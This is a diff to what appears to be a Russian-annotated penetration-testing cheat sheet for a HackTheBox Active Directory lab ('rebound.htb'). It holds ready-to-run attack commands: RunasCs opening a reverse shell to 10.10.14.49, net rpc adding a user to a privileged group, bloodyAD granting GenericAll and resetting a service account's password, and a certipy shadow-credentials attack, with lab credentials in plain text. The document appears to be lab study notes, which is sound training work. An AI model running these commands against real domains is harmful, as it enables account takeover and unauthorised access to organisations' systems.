@@ -455,7 +455,7 @@ https://github.com/mxdelta/SecLists/blob/master/Discovery/DNS/subdomains-top1mil
 
 .\RunasCs backup IZtLVsqMDMENsTTekNwKwHGrFpmANUFgxOwvHREm --bypass-uac --logon-type 8 cmd.exe -r 10.10.14.49:445
 
-# Net rpc
+#ACL ( Net rpc and bloodyad and certypy
 
 net rpc group addmem "SERVICEMGMT" "OOREND" -U "REBOUND.HTB/OOREND" -S "REBOUND.HTB" 		(Добавить пользователя в группу)
 
@@ -477,7 +477,8 @@ net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "
 ./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB'  oorend		(Generic all - добавить себя в OU )
 
 ./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  set password winrm_svc 'Password123!' 		(смена пароля при наличии прав)
- 
+
+ certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb		(shadow credential)
  
  # Получение пароля LAPS Admin
 
